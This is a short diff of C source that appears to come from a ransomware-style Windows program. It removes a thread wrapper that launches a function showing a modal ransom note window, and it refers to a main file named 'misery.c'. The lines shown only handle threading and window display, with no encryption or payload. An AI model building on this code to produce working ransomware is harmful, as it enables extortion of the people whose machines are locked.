@@ -45,21 +45,6 @@ static void     DestroyResources(void);
 void ShowRansomNoteWindow(void);  /* public, defined below */
 
 /* ═══════════════════════════════════════════════════════════════
- * PUBLIC ENTRY POINT  —  called from misery.c
- * Spawns a thread so it doesn't block the main misery execution.
- * ═══════════════════════════════════════════════════════════════ */
-static DWORD WINAPI _RansomThread(LPVOID lpParam) {
-    (void)lpParam;
-    ShowRansomNoteWindow();
-    return 0;
-}
-
-void LaunchRansomNoteAsync(void) {
-    HANDLE hThread = CreateThread(NULL, 0, _RansomThread, NULL, 0, NULL);
-    if (hThread) CloseHandle(hThread);
-}
-
-/* ═══════════════════════════════════════════════════════════════
  * PUBLIC: Show the modal ransom note window (blocking)
  * ═══════════════════════════════════════════════════════════════ */
 void ShowRansomNoteWindow(void) {
